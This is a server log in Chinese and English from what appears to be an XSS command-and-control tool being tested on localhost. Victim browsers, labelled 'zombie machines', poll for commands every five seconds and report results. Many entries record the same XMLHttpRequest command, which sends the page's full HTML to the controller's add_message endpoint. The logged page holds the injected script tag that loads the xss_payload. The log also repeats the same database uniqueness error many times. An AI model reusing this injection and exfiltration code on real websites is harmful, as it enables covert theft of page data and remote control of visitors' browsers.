2025-06-26 22:36:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:36:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:36:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:36:30 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:36:30 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:36:30.644881', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:36:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0022s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:36:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:30] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:36:30 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:36:30.641Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:36:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0065s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:36:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:30] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:36:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:36:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:36:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:36:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:36:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:36:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:36:35 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:36:35 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:36:35.641683', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:36:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0008s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:36:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:35] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:36:35 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:36:35.637Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:36:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0069s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:36:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:35] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:36:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:36:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:36:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:36:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:36:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:36:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:36:40 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:36:40 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:36:40.638Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:36:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0045s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:36:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:40] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:36:40 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:36:40.642184', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:36:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0048s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:36:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:40] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:36:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:36:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:36:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:36:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:36:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:36:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:36:45 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:36:45 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:36:45.641819', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:36:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0009s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:36:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:45] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:36:45 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:36:45.638Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:36:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0051s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:36:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:45] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:36:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:36:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:36:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:36:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:36:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:36:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:36:50 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:36:50 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:36:50.638Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:36:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0057s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:36:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:50] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:36:50 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:36:50.644597', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:36:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0041s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:36:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:50] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:36:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:36:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:36:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:36:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:36:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:36:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:36:55 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:36:55 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:36:55.639Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:36:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0044s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:36:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:55] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:36:55 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:36:55.643767', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:36:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0039s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:36:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:36:55] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:37:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:37:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:37:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:37:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:37:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:37:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:37:01 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:37:01 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:37:01.128Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:37:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0040s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:37:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:01] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:37:01 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:37:01.132741', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:37:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0043s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:37:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:01] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:37:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:37:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:37:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:37:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:37:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:37:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:37:06 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:37:06 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:37:06.129Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:37:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0047s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:37:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:06] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:37:06 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:37:06.135912', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:37:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0043s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:37:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:06] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:37:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:37:11 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
